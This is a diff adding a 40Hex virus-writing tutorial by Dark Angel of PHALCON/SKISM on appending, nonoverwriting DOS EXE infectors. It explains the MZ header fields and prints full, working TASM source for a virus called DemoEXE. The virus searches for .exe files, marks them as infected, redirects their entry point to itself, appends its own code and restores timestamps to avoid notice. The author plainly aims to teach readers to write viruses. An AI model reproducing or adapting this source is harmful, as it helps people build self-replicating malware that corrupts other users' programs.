@@ -1,0 +1,322 @@
+
+                    อออออออออออออออออออออออออออออออออออออออ
+                    An Introduction to Nonoverwriting Virii
+                            Part II: EXE Infectors
+                    อออออออออออออออออออออออออออออออออออออออ
+                                 By Dark Angel
+                    อออออออออออออออออออออออออออออออออออออออ
+
+       In the  last issue  of 40Hex,  I presented  theory and  code  for  the
+  nonoverwriting  COM   infector,  the   simplest  of  all  parasitic  virii.
+  Hopefully, having  learned COM  infections cold,  you are now ready for EXE
+  infections.  There is a grey veil covering the technique of EXE infections,
+  as the majority of virii are COM-only.
+
+       EXE infections  are, in  some  respects,  simpler  than  COM  viruses.
+  However, to  understand the infection, you must understand the structure of
+  EXE files  (naturally).   EXE files  are structured into segments which are
+  loaded consecutively  atop one  another.  Thus, all an EXE infector must do
+  is create  its own  segment in  the EXE  file and  alter  the  entry  point
+  appropriately.   Therefore, EXE  infections do  not require  restoration of
+  bytes of  code, but  rather involve  the manipulation  of the  header which
+  appears in  the beginning every EXE file and the appending of viral code to
+  the infected file.  The format of the header follows:
+
+   Offset Description
+     00   ID word, either 'MZ' or 'ZM'
+     02   Number of bytes in the last (512 byte) page in the image
+     04   Total number of 512 byte pages in the file
+     06   Number of entries in the segment table
+     08   Size of the header in (16 byte) paragraphs
+     0A   Minimum memory required in paragraphs
+     0C   Maximum memory requested in paragraphs
+     0E   Initial offset in paragraphs to stack segment from header
+     10   Initial offset in bytes of stack pointer from stack segment
+     12   Negative checksum (ignored)
+     14   Initial offset in bytes of instruction pointer from code segment
+     16   Initial offset in paragraphs of code segment from header
+     18   Offset of relocation table from start of file
+     1A   Overlay number (ignored)
+
+  The ID  word is  generally 'ZM'  (in the  Intel little-endian format).  Few
+  files start  with the  alternate form,  'MZ' (once  again in  Intel little-
+  endian format).   To  save space, a check for the alternate form of the EXE
+  ID in  the virus  may be omitted, although a few files may be corrupted due
+  to this omission.
+
+  The words  at offsets  2 and  4 are related.  The word at offset 4 contains
+  the filesize  in pages.   A  page is  a 512 byte chunk of memory, just as a
+  word is  a two  byte chunk of memory.  This number is rounded up, so a file
+  of length  514 bytes  would contain a 2 at offset 4 in the EXE header.  The
+  word at offset 2 is the image length modulo 512.  The image length does not
+  include the  header length.   This  is one of the bizarre quirks of the EXE
+  header.   Since the header length is usually a multiple of 512 anyway, this
+  quirk usually  does not  matter.  If the word at offset 2 is equal to four,
+  then it  is generally  ignored (heck,  it's never really used anyway) since
+  pre-1.10 versions  of the  Microsoft linker had a bug which caused the word
+  to always  be equal  to four.  If you are bold, the virus can set this word
+  to 4.   However, keep in mind that this was a bug of the linker and not all
+  command interpreters may recognise this quirk.
+
+  The minimum memory required by the program (offset A) can be ignored by the
+  virus, as  the maximum  memory is generally allocated to the program by the
+  operating system.   However,  once again,  ignoring this area of the header
+  MAY cause  an unsucessful  infection.   Simply adding  the  virus  size  in
+  paragraphs to this value can nullify the problem.
+
+  The words  representing the  initial stack segment and pointer are reversed
+  (not in  little-endian format).   In  other words,  an LES to this location
+  will yield  the stack  pointer in  ES and  the  stack  segment  in  another
+  register.   The initial  SS:SP is  calculated  with  the  base  address  of
+  0000:0000 being at the end of the header.
+
+  Similarly, the  initial CS:IP  (in little-endian format) is calculated with
+  the base  address of  0000:0000 at  the end of the header.  For example, if
+  the program  entry point  appears directly after the header, then the CS:IP
+  would be 0000:0000.  When the program is loaded, the PSP+10 is added to the
+  segment value (the extra 10 accounts for the 100h bytes of the PSP).
+
+  All the  relevant portions  of the  EXE header  have been covered.  So what
+  should be  done to  write a  nonoverwriting EXE infector?  First, the virus
+  must be appended to the end of the file.  Second, the initial CS:IP must be
+  saved and  subsequently changed  in the  header.   Third, the initial SS:SP
+  should also  be saved  and changed.   This  is to avoid any possible memory
+  conflicts from  the stack  overwriting viral  code.   Fourth, the file size
+  area of  the header should be modified to correctly reflect the new size of
+  the file.   Fifth,  any additional  safety modifications such as increasing
+  the minimum  memory allocation  should be made.  Last, the header should be
+  written to the infected file.
+
+  There are  several good areas for ID bytes in the EXE header.  The first is
+  in the stack pointer field.  Since it should be changed anyway, changing it
+  to a  predictable number  would add nothing to the code length.  Make sure,
+  however, to  make the stack pointer high enough to prevent code overwrites.
+  Another common  area for ID bytes is in the negative checksum field.  Since
+  it is  an unused  field, altering  it won't  affect the  execution  of  any
+  programs.
+
+  One further item should be mentioned before the code for the EXE infector.
+  It is important to remember that EXE files are loaded differently than COM
+  files.  Although a PSP is still built, the initial CS does NOT point to it.
+  Instead, it points to wherever the entry point happens to be.  DS and ES
+  point to the PSP, and therefore do NOT point to the entry point (your virus
+  code).  It is important to restore DS and ES to their proper values before
+  returning control to the EXE.
+
+  ----cut here---------------------------------------------------------------
+
+  .model tiny                             ; Handy TASM directive
+  .code                                   ; Virus code segment
+            org 100h                      ; COM file starting IP
+  ; Cheesy EXE infector
+  ; Written by Dark Angel of PHALCON/SKISM
+  ; For 40Hex Number 8 Volume 2 Issue 4
+  id = 'DA'                               ; ID word for EXE infections
+
+  startvirus:                             ; virus code starts here
+            call next                     ; calculate delta offset
+  next:     pop  bp                       ; bp = IP next
+            sub  bp,offset next           ; bp = delta offset
+
+            push ds
+            push es
+            push cs                       ; DS = CS
+            pop  ds
+            push cs                       ; ES = CS
+            pop  es
+            lea  si,[bp+jmpsave2]
+            lea  di,[bp+jmpsave]
+            movsw
+            movsw
+            movsw
+            movsw
+
+            mov  ah,1Ah                   ; Set new DTA
+            lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
+            int  21h
+
+            lea  dx,[bp+exe_mask]
+            mov  ah,4eh                   ; find first file
+            mov  cx,7                     ; any attribute
+  findfirstnext:
+            int  21h                      ; DS:DX points to mask
+            jc   done_infections          ; No mo files found
+
+            mov  al,0h                    ; Open read only
+            call open
+
+            mov  ah,3fh                   ; Read file to buffer
+            lea  dx,[bp+buffer]           ; @ DS:DX
+            mov  cx,1Ah                   ; 1Ah bytes
+            int  21h
+
+            mov  ah,3eh                   ; Close file
+            int  21h
+
+  checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
+            jnz  infect_exe
+  find_next:
+            mov  ah,4fh                   ; find next file
+            jmp  short findfirstnext
+  done_infections:
+            mov  ah,1ah                   ; restore DTA to default
+            mov  dx,80h                   ; DTA in PSP
+            pop  es
+            pop  ds                       ; DS->PSP
+            int  21h
+            mov  ax,es                    ; AX = PSP segment
+            add  ax,10h                   ; Adjust for PSP
+            add  word ptr cs:[si+jmpsave+2],ax
+            add  ax,word ptr cs:[si+stacksave+2]
+            cli                           ; Clear intrpts for stack manip.
+            mov  sp,word ptr cs:[si+stacksave]
+            mov  ss,ax
+            sti
+            db   0eah                     ; jmp ssss:oooo
+  jmpsave             dd ?                ; Original CS:IP
+  stacksave           dd ?                ; Original SS:SP
+  jmpsave2            dd 0fff00000h       ; Needed for carrier file
+  stacksave2          dd ?
+
+  creator             db '[MPC]',0,'Dark Angel of PHALCON/SKISM',0
+  virusname           db '[DemoEXE] for 40Hex',0
+
+  infect_exe:
+            les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
+            mov  word ptr [bp+jmpsave2], ax
+            mov  word ptr [bp+jmpsave2+2], es
+
+            les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
+            mov  word ptr [bp+stacksave2], es
+            mov  word ptr [bp+stacksave2+2], ax
+
+            mov  ax, word ptr [bp+buffer + 8] ; Get header size
+            mov  cl, 4                        ; convert to bytes
+            shl  ax, cl
+            xchg ax, bx
+
+            les  ax, [bp+offset newDTA+26]; Get file size
+            mov  dx, es                   ; to DX:AX
+            push ax
+            push dx
+
+            sub  ax, bx                   ; Subtract header size from
+            sbb  dx, 0                    ; file size
+
+            mov  cx, 10h                  ; Convert to segment:offset
+            div  cx                       ; form
+
+            mov  word ptr [bp+buffer+14h], dx ; New entry point
+            mov  word ptr [bp+buffer+16h], ax
+
+            mov  word ptr [bp+buffer+0Eh], ax ; and stack
+            mov  word ptr [bp+buffer+10h], id
+
+            pop  dx                       ; get file length
+            pop  ax
+
+            add  ax, heap-startvirus      ; add virus size
+            adc  dx, 0
+
+            mov  cl, 9                    ; 2**9 = 512
+            push ax
+            shr  ax, cl
+            ror  dx, cl
+            stc
+            adc  dx, ax                   ; filesize in pages
+            pop  ax
+            and  ah, 1                    ; mod 512
+
+            mov  word ptr [bp+buffer+4], dx ; new file size
+            mov  word ptr [bp+buffer+2], ax
+
+            push cs                       ; restore ES
+            pop  es
+
+            mov  cx, 1ah
+  finishinfection:
+            push cx                       ; Save # bytes to write
+            xor  cx,cx                    ; Clear attributes
+            call attributes               ; Set file attributes
+
+            mov  al,2
+            call open
+
+            mov  ah,40h                   ; Write to file
+            lea  dx,[bp+buffer]           ; Write from buffer
+            pop  cx                       ; cx bytes
+            int  21h
+
+            mov  ax,4202h                 ; Move file pointer
+            xor  cx,cx                    ; to end of file
+            cwd                           ; xor dx,dx
+            int  21h
+
+            mov  ah,40h                   ; Concatenate virus
+            lea  dx,[bp+startvirus]
+            mov  cx,heap-startvirus       ; # bytes to write
+            int  21h
+
+            mov  ax,5701h                 ; Restore creation date/time
+            mov  cx,word ptr [bp+newDTA+16h] ; time
+            mov  dx,word ptr [bp+newDTA+18h] ; date
+            int  21h
+
+            mov  ah,3eh                   ; Close file
+            int  21h
+
+            mov ch,0
+            mov cl,byte ptr [bp+newDTA+15h] ; Restore original
+            call attributes                 ; attributes
+
+  mo_infections: jmp find_next
+
+  open:
+            mov  ah,3dh
+            lea  dx,[bp+newDTA+30]        ; filename in DTA
+            int  21h
+            xchg ax,bx
+            ret
+
+  attributes:
+            mov  ax,4301h                 ; Set attributes to cx
+            lea  dx,[bp+newDTA+30]        ; filename in DTA
+            int  21h
+            ret
+
+  exe_mask            db '*.exe',0
+  heap:                                   ; Variables not in code
+  newDTA              db 42 dup (?)       ; Temporary DTA
+  buffer              db 1ah dup (?)      ; read buffer
+  endheap:                                ; End of virus
+
+  end       startvirus
+
+  ----cut here---------------------------------------------------------------
+
+  This is a simple EXE infector.  It has limitations; for example, it does
+  not handle misnamed COM files.  This can be remedied by a simple check:
+
+    cmp [bp+buffer],'ZM'
+    jnz misnamed_COM
+  continueEXE:
+
+  Take special notice of the done_infections and infect_exe procedures.  They
+  handle all  the relevant portions of the EXE infection.  The restoration of
+  the EXE  file simply  consists of  resetting the stack and a far jmp to the
+  original entry point.
+
+  A final  note on  EXE infections: it is often helpful to "pad" EXE files to
+  the nearest  segment.  This accomplishes two things.  First, the initial IP
+  is  always  0,  a  fact  which  can  be  used  to  eliminate  delta  offset
+  calculations.   Code space  can be  saved by  replacing all  those annoying
+  relative memory  addressing statements  ([bp+offset blip])  statements with
+  their absolute  counterparts (blip).   Second, recalculation of header info
+  can be  handled in  paragraphs, simplifying  it tremendously.  The code for
+  this is left as an exercise for the reader.
+
+  This file is dedicated to the [XxXX] (Censored. -Ed.) programmers (who have
+  yet to figure out how to  write EXE  infectors).  Hopefully, this  text can
+  teach them (and everyone else) how to progress beyond simple COM and spawn-
+  ing EXE infectors.   In the next issue of 40Hex,  I will present the theory
+  and code for the next step of file infector - the coveted SYS file.
